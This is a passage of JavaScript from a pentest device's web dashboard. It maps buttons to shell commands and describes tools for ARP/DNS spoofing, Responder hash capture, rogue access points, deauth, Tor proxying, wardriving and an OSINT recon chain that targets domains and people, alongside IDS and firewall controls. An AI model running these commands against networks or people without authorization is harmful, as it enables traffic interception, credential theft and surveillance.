    'pc-check':'proxychains4 -q curl -s --max-time 20 https://check.torproject.org/api/ip',
    'pc-config':'grep -A2 "\\[ProxyList\\]" /etc/proxychains4.conf',
    'pc-nmap':'proxychains4 -q nmap -sT -Pn -T4 --top-ports 20 TARGET',
    'pc-curl':'proxychains4 -q curl -s --max-time 25 TARGET',
    'pc-set-tor':'sudo sed -i "s/^socks[45].*/socks5 127.0.0.1 9050/" /etc/proxychains4.conf && echo "proxychains -> Tor (9050)"',
  };
  const cmd = T[action] || action;
  showToolInfo(action, cmd);
}

// Tool descriptions: what it does, when to use, notes/gotchas. Populated as
// tools are verified. Anything without an entry shows a generic card.
const TOOLINFO = {
  'bettercap': {name:'Bettercap', what:'All-in-one network attack framework — ARP spoofing, MITM, live sniffing, and device discovery.', use:'Map and intercept traffic on a network you are auditing. Runs net.probe to discover every device.', note:'Runs continuously on the detected interface. Stop with: pkill bettercap'},
  'responder': {name:'Responder', what:'Poisons LLMNR / NBT-NS / MDNS name resolution to capture NTLMv2 hashes from Windows devices.', use:'On a network with Windows machines, capture auth hashes for offline cracking.', note:'Runs continuously and waits for name lookups to poison. Stop with: pkill -f Responder.py'},
  'mitmproxy': {name:'mitmdump (mitmproxy)', what:'Headless HTTP/HTTPS intercepting proxy on port 8081.', use:'Point a test device\u2019s proxy at this host:8081 to inspect its web traffic. Install the mitmproxy CA cert on the device for HTTPS.', note:'Headless (mitmdump) \u2014 the interactive console needs a tty. Stop with: pkill mitmdump'},
  'arp-spoof': {name:'ARP Spoof', what:'Redirects a target device\u2019s traffic through the NanoPi via ARP cache poisoning.', use:'Intercept one device\u2019s traffic on a network you are testing.', note:'\u26a0 Replace TARGET with the victim device\u2019s IP before running.'},
  'dns-spoof': {name:'DNS Spoof', what:'Redirects DNS lookups for a domain to an IP you control.', use:'Redirect a target\u2019s traffic for a specific domain (e.g. a captive-portal test).', note:'\u26a0 Replace TARGET with the domain to spoof before running.'},
  'nmap-scan': {name:'LAN Scan (nmap)', what:'Discovers live hosts and open ports/services on the network you are connected to.', use:'See what devices and services exist on a network you\u2019ve joined.', note:'Scans the connected network\u2019s subnet automatically. -sV (version scan) is thorough but slow.'},
  'arp-scan': {name:'ARP Scan', what:'Fast layer-2 discovery of devices on the local segment.', use:'Quickly list every device\u2019s MAC + IP on the local network.', note:'Auto-detects the interface.'},
  'netdiscover': {name:'Netdiscover', what:'Passive/active ARP reconnaissance to find hosts.', use:'Discover hosts, including quiet ones, on the connected network.', note:'Scans the connected network\u2019s subnet.'},
  'rogue-start': {name:'Rogue AP Start', what:'Brings up a separate access point on the USB adapter.', use:'Create a test AP to see which of your devices connect, run payloads, or serve a captive portal.', note:'Runs on the USB adapter (not the tunnel-rat AP). Set SSID/pass/channel in the PINEAPPLE tab. Authorized testing only.'},
  'def-block': {name:'Block Device', what:'Real firewall block (nftables) that drops a device by MAC and kicks it off.', use:'Keep an unwanted device off your network \u2014 this actually works, unlike deauth.', note:'\u26a0 Replace MAC with the device\u2019s MAC. Undo with Unblock or Unblock ALL.'},
  'deauth': {name:'Deauth (test)', what:'Sends 802.11 deauth frames to disconnect a client from an AP.', use:'Test your OWN device\u2019s resilience to deauth.', note:'\u26a0 Disruption, NOT access control (devices reconnect). Treated as jamming \u2014 illegal in most places. Own devices only. Replace CLIENT_MAC and AP_BSSID.'},
  'sys-shutdown': {name:'Shutdown', what:'Safely powers off the NanoPi.', use:'Always use this instead of pulling power \u2014 an abrupt cut can corrupt the SD card.', note:'\u26a0 Waits 5s, then shuts down. Wait for the lights to stop before unplugging. Dashboard will go offline.'},
  'sys-reboot': {name:'Reboot', what:'Safely restarts the NanoPi.', use:'Restart after updates or if something is stuck.', note:'Dashboard drops for ~40s then comes back. Services restart on their own.'},
  'sys-services': {name:'Service Status', what:'Shows whether the core services are running, and any failed ones.', use:'Quick health check of tunnel-rat, hostapd, dnsmasq, tor, suricata.', note:''},
  'sys-disk': {name:'Disk Usage', what:'Free space and how much the captures are using.', use:'Check before long captures; clear old files from FILES/LOGS if low.', note:''},
  'sys-temp': {name:'CPU Temp', what:'Current CPU temperature.', use:'Check during heavy scanning that the board isn\u2019t overheating.', note:''},
  'ps-list': {name:'Running Tools', what:'Lists the pentest tools currently running, with their PIDs.', use:'See what\u2019s still running before starting something new or killing stuck tools.', note:''},
  'ps-kill-tools': {name:'Kill All Tools', what:'Stops every running pentest tool at once (bettercap, mitmproxy, responder, tcpdump, etc.).', use:'Clean slate \u2014 stop everything that\u2019s running without killing the dashboard.', note:'\u26a0 Protects the dashboard, AP, and system services \u2014 only kills the attack/capture tools.'},
  'wardrive-start': {name:'Start Wardriving', what:'Begins continuous WiFi logging, tagging each network with its GPS location, to a WiGLE-format CSV.', use:'Drive or walk around to map the networks in an area \u2014 the CSV uploads to wigle.net.', note:'Needs a GPS fix (check the GPS panel). Runs in the background until you Stop.'},
  'wardrive-stop': {name:'Stop & Save', what:'Stops the wardriving session and finalizes the WiGLE CSV.', use:'When done mapping \u2014 the CSV lands in the FILES tab, ready to download and upload.', note:''},
  'wardrive-status': {name:'Logging Status', what:'Shows whether wardriving is running, how many networks logged, and the current GPS fix.', use:'Check progress mid-session.', note:''},
  // ---- OSINT (recon workflow) ----
  'osint:whois': {name:'Whois', what:'Domain registration info \u2014 owner, registrar, nameservers, dates.', use:'First look at a target domain: who owns it, where it\u2019s registered.', note:'', combo:'Start here \u2192 then dig (DNS) \u2192 subfinder (subdomains).'},
  'osint:dig': {name:'DNS Lookup (dig)', what:'Queries DNS records \u2014 A, MX, NS, TXT, etc.', use:'Map a domain\u2019s DNS: mail servers, nameservers, IP addresses.', note:'', combo:'After whois \u2192 dig the domain, then nmap the IPs it returns.'},
  'osint:traceroute': {name:'Traceroute', what:'Traces the network path to a target, hop by hop.', use:'See the route and where a target sits on the network.', note:''},
  'osint:nmap': {name:'Nmap Scan', what:'Port + service scan \u2014 finds open ports and service versions.', use:'Probe a host (or the IPs/subdomains you found) for live services.', note:'', combo:'Feed it IPs from dig / subdomains from subfinder \u2192 then whatweb/nikto the web ports.'},
  'osint:sslscan': {name:'SSL Scan', what:'Analyzes SSL/TLS config \u2014 ciphers, protocols, certificate.', use:'Check a HTTPS host\u2019s TLS health and cert details.', note:'', combo:'Run on web hosts found by nmap (port 443).'},
  'osint:whatweb': {name:'WhatWeb', what:'Fingerprints a website\u2019s tech \u2014 CMS, frameworks, server.', use:'Identify what a web target is built on before deeper testing.', note:'', combo:'After nmap finds web ports \u2192 whatweb \u2192 then nikto.'},
  'osint:wafw00f': {name:'WAF Detect', what:'Detects a Web Application Firewall in front of a site.', use:'Know if a WAF will interfere before running web scans.', note:'', combo:'Run before nikto so you know what\u2019s filtering you.'},
  'osint:nikto': {name:'Nikto Scan', what:'Web vulnerability scanner \u2014 misconfigs, outdated software, known issues.', use:'Deeper web-server audit after you know the tech stack.', note:'Noisy \u2014 easily detected. Authorized targets only.', combo:'After whatweb/wafw00f \u2192 nikto the confirmed web hosts.'},
  'osint:subfinder': {name:'Subfinder', what:'Passive subdomain discovery from public sources.', use:'Expand a single domain into its full set of subdomains \u2014 the real attack surface.', note:'', combo:'Early step: subfinder \u2192 feed results to nmap \u2192 whatweb the live ones.'},
  'osint:fierce': {name:'Fierce DNS', what:'DNS reconnaissance / subdomain brute-force.', use:'Find subdomains subfinder missed via DNS guessing.', note:'', combo:'Pair with subfinder for broader subdomain coverage.'},
  'osint:amass': {name:'Amass Enum', what:'Deep attack-surface mapping \u2014 thorough subdomain enumeration.', use:'The heavyweight subdomain tool when you want maximum coverage.', note:'Slow \u2014 can take a while on big targets.', combo:'Use alongside subfinder; amass is deeper but slower.'},
  'osint:harvester': {name:'theHarvester', what:'Harvests emails, names, subdomains, IPs from public sources.', use:'Gather people/email intel and extra subdomains for a domain.', note:'', combo:'Run on the domain \u2192 emails feed social/people recon; subdomains feed nmap.'},
  'osint:sherlock': {name:'Sherlock', what:'Hunts a username across 300+ social platforms.', use:'Find where a username/handle exists online.', note:'For a username, not a domain.', combo:'Use with theHarvester results (names/handles found).'},
  'osint:exiftool': {name:'ExifTool', what:'Extracts metadata from files \u2014 GPS, author, timestamps, device.', use:'Pull hidden metadata from documents/images you\u2019ve collected.', note:'Needs a file path, not a domain.', combo:'Run on files gathered during recon.'},
  'osint:myip': {name:'My Public IP', what:'Shows your current public IP.', use:'Confirm your egress IP (e.g. check Tor/VPN changed it).', note:''},
  'osint:recon-ng': {name:'Recon-ng', what:'Modular recon framework for structured OSINT.', use:'Organize a full recon workflow with modules + a database.', note:'Interactive \u2014 best run in the terminal directly.', combo:'Ties the whole workflow together.'},
  'suricata-start': {name:'Start Suricata', what:'Starts the Suricata IDS service to watch network traffic for threats.', use:'Begin monitoring for malicious traffic.', note:'Needs its monitored interface set in /etc/suricata/suricata.yaml. Alerts show in DEFENSIVE \u2192 Malicious Traffic Alerts.'},
  'suricata-stop': {name:'Stop Suricata', what:'Stops the Suricata IDS service.', use:'Turn off monitoring (frees CPU/RAM \u2014 Suricata is heavy on a small board).', note:''},
  'suricata-status': {name:'Suricata Status', what:'Shows whether Suricata is running and its recent log.', use:'Check if the IDS is up before expecting alerts.', note:''},
};

// Show a tool\u2019s description in the center panel, with a Run-in-Terminal button.
function showToolInfo(action, cmd){
  const box=document.getElementById('tool-info');
  if(!box){ sendToTerminal(cmd); return; }
  const info=TOOLINFO[action];
  const needsEdit=/\b(TARGET|PORT|BSSID|MAC|CLIENT_MAC|AP_BSSID|name)\b/.test(cmd);
  let html='';
  if(info){
    html+='<div style="color:var(--red);font-size:1.1em;letter-spacing:.08em;margin-bottom:6px">'+escapeHtml(info.name)+'</div>';
    html+='<div style="margin-bottom:6px"><b style="color:var(--xred)">What:</b> '+escapeHtml(info.what)+'</div>';
    html+='<div style="margin-bottom:6px"><b style="color:var(--xred)">When:</b> '+escapeHtml(info.use)+'</div>';
    if(info.note) html+='<div style="margin-bottom:6px;color:var(--sec)"><b style="color:var(--xred)">Note:</b> '+escapeHtml(info.note)+'</div>';
    if(info.combo) html+='<div style="margin-bottom:8px;color:var(--dim)"><b style="color:var(--xred)">Chain with:</b> '+escapeHtml(info.combo)+'</div>';
  } else {
    html+='<div style="color:var(--red);font-size:1.05em;margin-bottom:6px">'+escapeHtml(action)+'</div>';
  }
  html+='<div style="margin:6px 0"><b style="color:var(--xred)">Command:</b></div>';
  html+='<div style="font-family:monospace;font-size:.78em;background:#000;border:1px solid var(--border);border-radius:3px;padding:6px 8px;color:var(--sec);word-break:break-all;margin-bottom:8px">'+escapeHtml(cmd)+'</div>';
  html+='<button class="tool-btn" style="width:auto;display:inline-flex" onclick="sendToTerminal('+JSON.stringify(cmd).replace(/"/g,'&quot;')+')"><span class="icon">\u25b6</span>Run in Terminal</button>';
  if(needsEdit) html+='<span style="color:var(--red);font-size:.75em;margin-left:8px">\u2190 edit the placeholder in the terminal before pressing Enter</span>';
  box.innerHTML=html;
}

// Send a command into the real PTY terminal (buttons act as shortcuts).
// Switches to the TERMINAL tab, types the command, and runs it — UNLESS it
// contains an UPPERCASE placeholder (TARGET, PORT, BSSID, MAC, name) that the
// user must fill in first, in which case it types without the final Enter.
// ---- Adapter selector ----
let _adapter='';   // chosen iface, '' = auto
function loadAdapters(){
  fetch('/api/adapters',{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    const sel=document.getElementById('adapter-sel');
    if(!sel) return;
    const cur=sel.value;
    sel.innerHTML='<option value="">Auto-detect</option>';
    (d.adapters||[]).forEach(a=>{
      const o=document.createElement('option');
      o.value=a.iface;
      o.textContent=a.iface+' — '+a.role+(a.ip?(' ('+a.ip+')'):'');
      sel.appendChild(o);
    });
    sel.value=cur;
  }).catch(()=>{});
}
function setAdapter(){
  const sel=document.getElementById('adapter-sel');
  _adapter=sel?sel.value:'';
}
function sendToTerminal(cmd){
  // If an adapter is chosen, force it for this command via TR_ADAPTER.
  if(_adapter){ cmd='TR_ADAPTER='+_adapter+' '+cmd; }
  // Jump to the terminal tab (and init it) via the normal tab switch.
  let termBtn=null;
  document.querySelectorAll('.tab-btn').forEach(b=>{
    if((b.getAttribute('onclick')||'').indexOf("'terminal'")>=0) termBtn=b; });
  if(termBtn) termBtn.click();           // triggers switchTab -> termInit()
  // Detect placeholders that need editing before running.
  const needsEdit = /\b(TARGET|PORT|BSSID|MAC|CLIENT_MAC|AP_BSSID|name)\b/.test(cmd);
  const payload = needsEdit ? cmd : (cmd + '\n');   // \n = press Enter
  // Give the terminal a moment to initialise, then write to the PTY.
  const send=()=>{
    fetch('/api/term/write',{method:'POST',
      headers:{'X-API-Key':TR_KEY,'Content-Type':'application/octet-stream'},
      body: payload});
    if(_xterm) _xterm.focus();
  };
  if(_xterm){ setTimeout(send,120); } else { setTimeout(send,500); }
}

function rogueStart(){
  const ssid=(document.getElementById('rogue-ssid')||{value:''}).value.trim()||'tunnel-rat-test';
  const ch=(document.getElementById('rogue-chan')||{value:'6'}).value.trim()||'6';
  const pass=(document.getElementById('rogue-pass')||{value:''}).value.trim();
  // sanitize: strip double-quotes so the shell command stays well-formed.
  const safe=ssid.replace(/"/g,'');
  const safePass=pass.replace(/"/g,'');
  let cmd='sudo bash ~/tunnel-rat-build/rogue-ap.sh start "'+safe+'" '+ch;
  if(safePass) cmd+=' "'+safePass+'"';
  // SSID/pass already filled from the form, so run it straight in the terminal.
  sendToTerminal(cmd);
}

function showOsintGuide(){
  const box=document.getElementById('tool-info');
  if(!box) return;
  box.innerHTML =
    '<div style="color:var(--red);font-size:1.1em;letter-spacing:.06em;margin-bottom:8px">OSINT RECON — HOW IT FLOWS</div>'+
    '<div style="margin-bottom:8px">OSINT = Open-Source INTelligence: building a picture of a target from public info, '+
      '<b style="color:var(--xred)">without touching it in a way that needs permission</b> (until you probe hosts). '+
      'Enter your target (domain / IP / username) in the OSINT box, then work the phases top to bottom.</div>'+
    '<div style="color:var(--xred);margin:8px 0 2px">① DOMAIN &amp; DNS — "what is this target?"</div>'+
    '<div style="margin-bottom:6px"><b>Whois</b> = who owns it / where registered. <b>DNS Lookup (dig)</b> = records: mail (MX), '+
      'nameservers (NS), IPs (A). <b>Traceroute</b> = network path. <i>Goal: the footprint and real IPs.</i></div>'+
    '<div style="color:var(--xred);margin:8px 0 2px">② SUBDOMAINS — "what else do they run?"</div>'+
    '<div style="margin-bottom:6px"><b>Subfinder</b> (fast/passive) and <b>Amass</b> (deep/slow) find mail., dev., vpn., admin. — '+
      'each a new door. <b>Fierce</b> brute-forces DNS for ones they miss. <i>Goal: the full host list = attack surface.</i></div>'+
    '<div style="color:var(--xred);margin:8px 0 2px">③ PROBE HOSTS — "what\u2019s running?"</div>'+
    '<div style="margin-bottom:6px">Take the IPs/subdomains and look closer. <b>Nmap</b> = open ports + service versions. '+
      '<b>SSL Scan</b> = TLS/cert health of HTTPS hosts. <i>You\u2019re now touching the target — authorized testing only.</i></div>'+
    '<div style="color:var(--xred);margin:8px 0 2px">④ WEB — "what are the sites built on?"</div>'+
    '<div style="margin-bottom:6px"><b>WhatWeb</b> = tech fingerprint (WordPress? Nginx? versions?). <b>WAF Detect</b> = is a firewall '+
      'filtering you? <b>Nikto</b> = web-server misconfigs + known issues (noisy, shows in logs). <i>Goal: web-stack weaknesses.</i></div>'+
    '<div style="color:var(--xred);margin:8px 0 2px">⑤ PEOPLE &amp; EMAIL — "who works there?"</div>'+
    '<div style="margin-bottom:6px"><b>theHarvester</b> = emails/names/subdomains from public sources. <b>Sherlock</b> = a username '+
      'across 300+ platforms. <i>Goal: the human attack surface.</i></div>'+
    '<div style="color:var(--xred);margin:8px 0 2px">⑥ METADATA &amp; MISC</div>'+
    '<div style="margin-bottom:8px"><b>ExifTool</b> = hidden file metadata (GPS, author). <b>My Public IP</b> = your egress '+
      '(check Tor/VPN). <b>Recon-ng</b> = full workflow with a database.</div>'+
    '<div style="color:var(--sec);border-top:1px solid var(--border);padding-top:8px"><b style="color:var(--xred)">The chain:</b> '+
      'whois + dig → subfinder/amass → nmap the hosts → whatweb/nikto the web ones → theHarvester for people. '+
      'Click any tool for its own "chain with" note.</div>'+
    '<div style="color:var(--dim);margin-top:8px;font-size:.92em">⚠ Phases ①②⑤⑥ are passive (public info). ③④ contact the target — '+
      'own/authorized systems only.</div>';
}
function osint(tool) {
  const raw=(document.getElementById('osint-target')||{value:''}).value.trim();
  if(!raw && !['myip','recon-ng'].includes(tool)){
    const box=document.getElementById('tool-info');
    if(box) box.innerHTML='<div style="color:var(--red)">⚠ Enter a target (domain / IP / username) in the OSINT box above first, then click the tool.</div>';
    return;
  }
  const t=raw||'TARGET';
  const T={
    'whois':'whois '+t,'dig':'dig '+t+' ANY +short','traceroute':'traceroute -m 15 '+t,
    'nmap':'nmap -sV -T4 --open '+t,'sslscan':'sslscan --no-colour '+t,
    'whatweb':'whatweb -v '+t,'wafw00f':'wafw00f '+t,'nikto':'nikto -h '+t+' -maxtime 60',
    'subfinder':'subfinder -d '+t+' -silent','fierce':'fierce --domain '+t,
    'amass':'amass enum -passive -d '+t,
    'harvester':'theharvester -d '+t+' -b bing,duckduckgo,google',
    'sherlock':'sherlock '+t+' --timeout 10','exiftool':'exiftool '+t,
    'myip':'curl -s https://ipinfo.io/ip','recon-ng':'recon-ng',
  };
  const cmd=T[tool]||tool+' '+t;
  showToolInfo('osint:'+tool, cmd);
}

// CLI terminal execution
const cliHist=[];let cliIdx=-1;
function cliAppend(html){
  const el=document.getElementById('cli-output');
  if(el){el.innerHTML+=html+'\n';el.scrollTop=el.scrollHeight;}
}
let streamInterval = null;
function stopStream() {
  if(streamInterval) { clearInterval(streamInterval); streamInterval = null; }
}
function startStream(tool, lastLen) {
  stopStream();
  streamInterval = setInterval(()=>{
    fetch('/api/cli/tail?tool='+tool, {headers:{'X-API-Key':TR_KEY}})
      .then(r=>r.json()).then(d=>{
        if(d.output && d.output.length > lastLen) {
          const newText = d.output.slice(lastLen);
          lastLen = d.output.length;
          cliAppend('<span style="color:#aa2222">'+ansiToHtml(newText)+'</span>');
        }
      }).catch(()=>{});
  }, 1000);
}
function cliSubmit(){
  const inp=document.getElementById('cli-input');
  if(!inp)return;const cmd=inp.value.trim();if(!cmd)return;
  cliHist.unshift(cmd);cliIdx=-1;inp.value='';
  stopStream();
  cliAppend('<span style="color:var(--xred)">tunnel-rat $ '+cmd.replace(/</g,'&lt;')+'</span>');
  fetch('/api/cli',{method:'POST',headers:{'Content-Type':'application/json','X-API-Key':TR_KEY},body:JSON.stringify({cmd})})
    .then(r=>r.json()).then(d=>{
      cliAppend('<span style="color:#cc2222">'+ansiToHtml(d.output||d.error||'(no output)')+'</span>');
      // If background tool started, stream its log
      if(d.stream) {
        const tool = d.stream.split('tool=')[1];
        cliAppend('<span style="color:var(--dim)">[ streaming live output — pkill '+tool+' to stop ]</span>');
        startStream(tool, 0);
      }
    })
    .catch(e=>{cliAppend('<span style="color:var(--dim)">Error: '+e+'</span>');});
}
function cliKey(e){
  const inp=document.getElementById('cli-input');
  if(e.key==='Enter'){cliSubmit();}
  else if(e.key==='ArrowUp'){cliIdx=Math.min(cliIdx+1,cliHist.length-1);inp.value=cliHist[cliIdx]||'';e.preventDefault();}
  else if(e.key==='ArrowDown'){cliIdx=Math.max(cliIdx-1,-1);inp.value=cliIdx>=0?cliHist[cliIdx]:'';e.preventDefault();}
}
cliAppend('<span style="color:var(--red)">╔══════════════════════════════════════╗</span>');
cliAppend('<span style="color:var(--red)">║   TUNNEL R.A.T. TERMINAL  v14       ║</span>');
cliAppend('<span style="color:var(--red)">╚══════════════════════════════════════╝</span>');
cliAppend('<span style="color:var(--dim)">Click any button to populate a command, edit it, then press ENTER</span>');
cliAppend('');

// ── WiFi tab: USB uplink + tunnel-rat AP ─────────────────────────────
// SSIDs come straight off the air, so everything rendered here is escaped.
// A hostile network name must never be able to run script on a page that
// has a root shell behind it.
function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
function sigBars(s){s=+s||0;return s>=75?'▂▄▆█':s>=50?'▂▄▆_':s>=25?'▂▄__':'▂___';}
function postJSON(url,body){return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})}).then(r=>r.json());}
function wifiMsg(t,bad){const e=document.getElementById('wifi-msg');if(e){e.textContent=t||'';e.style.color=bad?'var(--xred)':'var(--dim)';}}

let wifiNets=[], wifiSaved=[], wifiPending=null;

function wifiStatus(){
  return fetch('/api/wifi/status').then(r=>r.json()).then(d=>{
    const u=document.getElementById('wifi-uplink'), a=document.getElementById('wifi-ap');
    if(!d.ok){ u.innerHTML='<span style="color:var(--xred)">'+esc(d.error)+'</span>'; a.textContent='—'; return; }
    const up=d.uplink||{};
    let h = up.connected
      ? '<div style="color:var(--xred)">● '+esc(up.ssid||up.connection)+'</div><div>'+esc(up.ip||'waiting for an IP')+(up.signal!=null?' &nbsp;'+sigBars(up.signal)+' '+esc(up.signal)+'%':'')+'</div>'
      : '<div style="color:var(--border)">○ not connected</div>';
    h += '<div style="color:var(--border)">adapter: '+esc(up.iface||'none found')+'</div>';
    h += '<div style="color:var(--border)">internet via <span style="color:#cc2222">'+esc(d.default_dev||'nothing')+'</span></div>';
    u.innerHTML = h;
    const ap=d.ap||{};
    if(!ap.exists){
      a.innerHTML='<span style="color:var(--xred)">No AP profile named '+esc(ap.con)+'</span>';
    } else {
      const cl=ap.clients||[];
      let ah = '<div style="color:'+(ap.active?'var(--xred)':'var(--border)')+'">'+(ap.active?'● ':'○ ')+esc(ap.ssid)+(ap.active?'':' (off)')+'</div>';
      ah += '<div>'+esc(ap.ip)+' on '+esc(ap.iface)+'</div>';
      ah += '<div style="color:var(--border)">'+cl.length+' connected</div>';
      cl.forEach(c=>{ ah += '<div style="color:var(--dim)">'+esc(c.ip||c.mac)+' '+esc(c.host)+(c.signal!=null?' <span style="color:var(--border)">'+esc(c.signal)+' dBm</span>':'')+'</div>'; });
      a.innerHTML = ah;
    }
    wifiSaved = d.saved||[];
    renderSaved();
  }).catch(e=>wifiMsg('Could not load WiFi status: '+e,true));
}

function renderSaved(){
  const el=document.getElementById('wifi-saved'); if(!el) return;
  el.innerHTML = wifiSaved.length ? wifiSaved.map((s,i)=>
    '<div class="wrow" style="cursor:default"><span class="ws">'+esc(s.name)+'</span><button class="wx" onclick="wifiForget('+i+')">✕ forget</button></div>'
  ).join('') : '<div style="color:var(--dim)">None yet. Join a network above to save it.</div>';
}

function renderNets(){
  const el=document.getElementById('wifi-list'); if(!el) return;
  el.innerHTML = wifiNets.length ? wifiNets.map((n,i)=>
    '<button class="wrow'+(n.in_use?' on':'')+'" onclick="wifiPick('+i+')" title="'+esc((n.security||'open')+' · ch '+(n.channels||[]).join(','))+'">'+
      '<span class="wb">'+sigBars(n.signal)+'</span>'+
      '<span class="ws">'+esc(n.ssid)+'</span>'+
      (n.in_use?'<span>●</span>':'')+(n.saved?'<span title="saved">★</span>':'')+
      (n.secure?'<span>🔒</span>':'<span title="open network">○</span>')+
    '</button>').join('') : '<div style="color:var(--dim)">No networks in range.</div>';
}

function wifiScan(){
  wifiMsg('Scanning... about 5 seconds');
  document.getElementById('wifi-pw-row').style.display='none';
  fetch('/api/wifi/scan').then(r=>r.json()).then(d=>{
    if(!d.ok){ wifiMsg(d.error,true); return; }
    wifiNets = d.networks||[];
    renderNets();
    wifiMsg(wifiNets.length+' networks found on '+d.iface+'. Tap one to join.');
  }).catch(e=>wifiMsg('Scan failed: '+e,true));
}

function wifiPick(i){
  const n=wifiNets[i]; if(!n) return;
  if(n.in_use){ wifiMsg('Already connected to '+n.ssid); return; }
  if(n.saved || !n.secure){ wifiJoin(n.ssid,''); return; }
  wifiPending=i;
  document.getElementById('wifi-pw-label').textContent='Password for '+n.ssid;
  document.getElementById('wifi-pw-row').style.display='block';
  const p=document.getElementById('wifi-pw'); p.value=''; p.focus();
}

function wifiJoinPending(){
  const n=wifiNets[wifiPending]; if(!n) return;
  const pw=document.getElementById('wifi-pw').value;
  document.getElementById('wifi-pw-row').style.display='none';
  wifiJoin(n.ssid,pw);
}

function wifiJoin(ssid,pw){
  wifiMsg('Joining '+ssid+'... this can take up to a minute');
  postJSON('/api/wifi/connect',{ssid,password:pw}).then(d=>{
    if(d.ok){
      wifiNets.forEach(x=>{ x.in_use = x.ssid===ssid; if(x.ssid===ssid) x.saved=true; });
      renderNets();
      wifiMsg('Joined '+ssid+(d.ip?' as '+d.ip:''));
      wifiStatus();
    } else wifiMsg(ssid+': '+(d.error||'could not join'),true);
  }).catch(e=>wifiMsg('Join failed: '+e,true));
}

function wifiForget(i){
  const s=wifiSaved[i]; if(!s) return;
  if(!confirm('Forget '+s.name+'? The uplink will stop joining it automatically.')) return;
  postJSON('/api/wifi/forget',{name:s.name}).then(d=>{
    wifiMsg(d.ok?'Forgot '+s.name:(d.error||'Could not forget '+s.name),!d.ok);
    wifiStatus();
  });
}

function wifiDisconnect(){
  if(!confirm('Disconnect the WiFi uplink? It stays off until you join a network again.')) return;
  postJSON('/api/wifi/disconnect').then(d=>{
    wifiMsg(d.ok?'Uplink disconnected':(d.error||'Could not disconnect'),!d.ok);
    wifiNets.forEach(x=>x.in_use=false); renderNets();
    wifiStatus();
  });
}

function wifiTest(){
  wifiMsg('Testing the uplink...');
  postJSON('/api/wifi/test').then(d=>wifiMsg(d.ok?d.msg:d.error,!d.ok)).catch(e=>wifiMsg('Test failed: '+e,true));
}

function apSetPassword(){
  const el=document.getElementById('ap-pw'), pw=el.value;
  if(pw.length<8||pw.length>63){ wifiMsg('The AP password needs 8 to 63 characters',true); return; }
  if(!confirm('Change the tunnel-rat AP password? The AP restarts, and anything on it (maybe this browser) has to rejoin with the new password.')) return;
  postJSON('/api/wifi/ap',{password:pw}).then(d=>{
    wifiMsg(d.ok?d.msg:(d.error||'Could not change the AP password'),!d.ok);
    if(d.ok) el.value='';
  }).catch(()=>wifiMsg('The AP is restarting. Rejoin it with the new password.'));
}

// ── Pineapple Pager tab ──────────────────────────────────────────────
let pagerFiles=[], pagerAPs=[], pagerFile='';

function pagerRefresh(){
  fetch('/api/pineapple/status').then(r=>r.json()).then(d=>{
    const el=document.getElementById('pager-status');
    el.innerHTML = d.last_seen
      ? '<div style="color:var(--xred)">● Last upload '+esc(d.ago)+' ago</div><div>from '+esc(d.last_ip||'unknown')+', '+esc(d.last_count)+' APs</div><div style="color:var(--border)">'+esc(d.uploads)+' uploads saved</div>'
      : '<div style="color:var(--border)">○ No uploads yet</div><div style="color:var(--dim)">Run the recon payload on the Pager with its upload step turned on.</div>';
  }).catch(()=>{});
  fetch('/api/pineapple/uploads').then(r=>r.json()).then(d=>{
    pagerFiles=d.files||[];
    const el=document.getElementById('pager-files');
    el.innerHTML = pagerFiles.length ? pagerFiles.map((f,i)=>
      '<button class="wrow'+(f.name===pagerFile?' on':'')+'" onclick="pagerOpen('+i+')"><span class="ws">'+esc(f.when)+'</span><span class="wb">'+esc(f.count)+' APs</span></button>'
    ).join('') : '<div style="color:var(--dim)">Nothing uploaded yet.</div>';
  }).catch(()=>{});
}

function pagerOpen(i){
  const f=pagerFiles[i]; if(!f) return;
  pagerFile=f.name;
  setLiveTab('pineapple');
  document.getElementById('pager-view').textContent='Loading...';
  fetch('/api/pineapple/view?file='+encodeURIComponent(f.name)).then(r=>r.json()).then(d=>{
    if(!d.ok){ document.getElementById('pager-view').textContent=d.error||'Could not open that upload'; return; }
    pagerAPs=d.aps||[];
    document.getElementById('pager-title').textContent='PAGER RECON '+f.when;
    pagerRender();
    pagerRefresh();
  });
}

function pagerRender(){
  const q=(document.getElementById('pager-filter').value||'').toLowerCase();
  const rows=pagerAPs.filter(a=>!q||(a.ssid+' '+a.bssid).toLowerCase().includes(q));
  const open=pagerAPs.filter(a=>a.open).length;
  document.getElementById('pager-summary').textContent=pagerAPs.length+' APs, '+open+' open'+(q?', '+rows.length+' shown':'');
  document.getElementById('pager-view').innerHTML = rows.length
    ? '<table id="pager-table"><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>SIGNAL</th><th>SECURITY</th><th>SEEN</th></tr>'+
      rows.map(a=>'<tr'+(a.open?' class="open"':'')+'><td>'+(a.ssid?esc(a.ssid):'<span style="color:var(--dim)">(hidden)</span>')+'</td><td>'+esc(a.bssid)+'</td><td>'+esc(a.channel)+'</td><td>'+esc(a.signal)+'</td><td>'+esc(a.security||(a.open?'open':''))+'</td><td>'+esc(a.seen)+'</td></tr>').join('')+
      '</table>'
    : '<div style="color:var(--dim)">'+(q?'No APs match that filter.':'This upload has no APs in it.')+'</div>';
}

loadLog(); setInterval(loadLog, 10000);

// ════════ v16: Flipper Zero (Tunnel R.A.T. firmware) — USB or WiFi bridge ════════
function fzStatus(){
  fetch('/api/fz/status').then(r=>r.json()).then(d=>{
    const el=document.getElementById('fz-state'); if(!el) return;
    let h;
    if(d.link==='usb') h='<span style="color:#cc2222">● USB — '+escapeHtml(d.addr)+'</span>';
    else if(d.link==='wifi') h='<span style="color:#cc2222">● WIFI BRIDGE — '+escapeHtml(d.addr)+'</span>';
    else h='<span style="color:var(--dim)">○ Not connected — USB cable or Tunnel R.A.T. Link + bridge</span>';
    if(d.bridge) h+='<br>bridge '+escapeHtml(d.bridge.id||'?')+' · '+d.bridge.age+'s ago · RSSI '+escapeHtml(String(d.bridge.rssi));
    el.innerHTML=h;
    fetch('/api/fz/link').then(r=>r.json()).then(l=>{
      if(!l.connected) return;
      el.innerHTML+='<br><span style="color:#cc2222">● LINK APP — '+escapeHtml(l.port)+'</span>'+
        (l.modes.length?' · running: '+escapeHtml(l.modes.join(', ')):'');
    }).catch(()=>{});
  }).catch(()=>{});
